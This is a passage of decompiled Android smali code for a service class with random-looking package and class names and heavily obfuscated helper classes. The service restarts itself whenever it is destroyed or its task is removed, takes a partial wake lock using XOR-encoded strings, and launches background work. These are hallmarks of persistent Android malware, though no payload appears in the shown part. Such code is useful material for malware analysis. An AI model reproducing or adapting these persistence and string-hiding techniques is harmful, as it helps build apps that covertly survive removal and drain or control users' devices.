    const-class v0, Lcom/vknnolqo/p9sv5zvf/JhyDYeh2;

    invoke-direct {p0, v0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->G(Ljava/lang/Class;)V

    const-class v0, Lcom/vknnolqo/p9sv5zvf/LrdeKHXS;

    invoke-direct {p0, v0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->G(Ljava/lang/Class;)V

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->I()V

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->H()V

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->K()V

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->J()V

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 1

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ov;->c()Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ov;

    move-result-object v0

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->d:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ov;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->F(Landroid/content/Context;)V

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->b:Landroid/os/Handler;

    return-void
.end method

.method public onDestroy()V
    .locals 3

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->g()V

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_0

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/jr;->a(Lcom/vknnolqo/p9sv5zvf/CtKus0KT;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_0
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :goto_0
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->F(Landroid/content/Context;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sput-object p1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->f:Landroid/content/Context;

    const/4 p1, 0x5

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 p2, 0x8

    new-array p3, p2, [B

    fill-array-data p3, :array_1

    invoke-static {p1, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/os/PowerManager;

    sget-object p3, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->e:Landroid/os/PowerManager$WakeLock;

    if-nez p3, :cond_0

    const/16 p3, 0x9

    new-array p3, p3, [B

    fill-array-data p3, :array_2

    new-array p2, p2, [B

    fill-array-data p2, :array_3

    invoke-static {p3, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p2

    const p3, 0x20000001

    invoke-virtual {p1, p3, p2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object p1

    sput-object p1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->e:Landroid/os/PowerManager$WakeLock;

    :cond_0
    sget-object p1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->e:Landroid/os/PowerManager$WakeLock;

    if-eqz p1, :cond_1

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result p1

    if-nez p1, :cond_1

    sget-object p1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->e:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {p1}, Landroid/os/PowerManager$WakeLock;->acquire()V

    const/4 p1, 0x0

    sput-boolean p1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->j:Z

    :cond_1
    sget-object p1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;->g:Ljava/util/concurrent/ExecutorService;

    new-instance p2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/lr;

    invoke-direct {p2, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/lr;-><init>(Lcom/vknnolqo/p9sv5zvf/CtKus0KT;)V

    invoke-interface {p1, p2}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    const/4 p1, 0x1

    return p1

    nop

    :array_0
    .array-data 1
        -0x29t
        -0x18t
        -0x31t
        -0x10t
        -0x41t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x59t
        -0x79t
        -0x48t
        -0x6bt
        -0x33t
        0x6ft
        -0x33t
        -0x50t
    .end array-data

    :array_2
    .array-data 1
        -0x2ft
        -0x1at
        -0x23t
        -0x32t
        -0x1ct
        0x3et
        -0x74t
        -0xat
        -0xct
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x7at
        -0x53t
        -0x19t
        -0x67t
        -0x75t
        0x4ct
        -0x19t
        -0x6dt
    .end array-data
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    invoke-static {p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/jr;->a(Lcom/vknnolqo/p9sv5zvf/CtKus0KT;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_0
    invoke-virtual {p0, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :goto_0
    return-void
.end method
